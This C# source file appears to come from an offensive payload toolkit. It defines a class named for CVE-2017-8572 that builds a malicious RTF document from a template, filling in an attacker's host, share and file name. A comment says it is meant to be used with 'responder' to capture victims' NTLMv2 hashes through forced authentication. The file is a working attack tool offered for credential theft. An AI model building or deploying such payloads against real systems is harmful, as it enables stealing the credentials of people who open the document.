using System.Diagnostics;
using System.IO;

using MyWarez.Core;
using System.Text;

namespace MyWarez.Payloads
{
    // TODO: add exploit to a user specified Rtf file

    // Use with "responder" to catch NTLMv2 hashes
    public sealed class CVE_2017_8572 : Rtf
    {
        private static readonly string ResourceDirectory = Path.Join(Core.Constants.PayloadsResourceDirectory, "Windows", "CredentialAccess", "ForcedAuthentication", nameof(CVE_2017_8572));
        private static readonly string ResourceFilePath = Path.Join(ResourceDirectory, "message.rtf");
        private static readonly string HostnamePlaceholder = "hostname";
        private const string SharenamePlaceholder = "sharename";
        private const string FilenamePlaceholder = "filename.png";

        public CVE_2017_8572(string host, string sharename=SharenamePlaceholder, string filename=FilenamePlaceholder) : base(BuildRtf(host, sharename, filename)) { }

        private static byte[] BuildRtf(string host, string sharename, string filename)
        {
            var rtfText = File.ReadAllText(ResourceFilePath);
            rtfText = rtfText.Replace(HostnamePlaceholder, host);
            rtfText = rtfText.Replace(SharenamePlaceholder, sharename);
            rtfText = rtfText.Replace(FilenamePlaceholder, filename);
            return Encoding.ASCII.GetBytes(rtfText);
        }
    }
}
